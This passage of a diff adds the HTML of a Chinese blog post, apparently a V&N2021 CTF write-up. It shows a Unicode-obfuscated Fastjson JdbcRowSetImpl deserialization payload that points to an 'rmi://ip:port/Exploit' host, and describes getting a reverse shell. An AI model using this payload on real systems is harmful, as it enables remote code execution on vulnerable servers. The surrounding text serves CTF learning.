+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>;<span class="token comment">// 需要Unicode编码</span></code></pre>
+
+
+
+<img src="/article/VN2021ctf/image-20210315140159832.png" class="" title="image-20210315140159832" loading="lazy">
+
+<pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span>
+	<span class="token property">"e"</span><span class="token operator">:</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073"</span><span class="token punctuation">,</span>
+		<span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token property">"name"</span><span class="token operator">:</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"</span><span class="token punctuation">,</span>
+		<span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/Exploit"</span><span class="token punctuation">,</span>
+		<span class="token property">"\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>;</code></pre>
+
+
+
+<p>服务器加载了恶意class文件，成功getshell</p>
+<img src="/article/VN2021ctf/image-20210315140505582.png" class="" title="image-20210315140505582" loading="lazy">
+
+
+
+<p>编码问题，整了一个小时就是反弹不了shell，原来是java反弹shell的编码问题，去<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">网站</a>编码一下就成功了</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>孩子好菜，被《简单的签到》搞傻了。查阅了不少资料，拜读了很多大佬的博客，虽然最后还是没做出来，等等WP康康大佬的思路也许比自己忙活半天有用，当然少不了原理的研究。</p>
+<p>继续学习啦</p>
+<p>（想结识更多大佬）</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Err0r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/VN2021ctf/" title="V&amp;N2021公开赛">https://err0r.top/article/VN2021ctf/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/article/Nepctf2021/" rel="prev" title="NepCTF2021"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">NepCTF2021</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/article/hgame2021/" rel="next" title="HGAME2021"><span class="post-nav-text">HGAME2021</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2023 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Err0r</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.9</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>
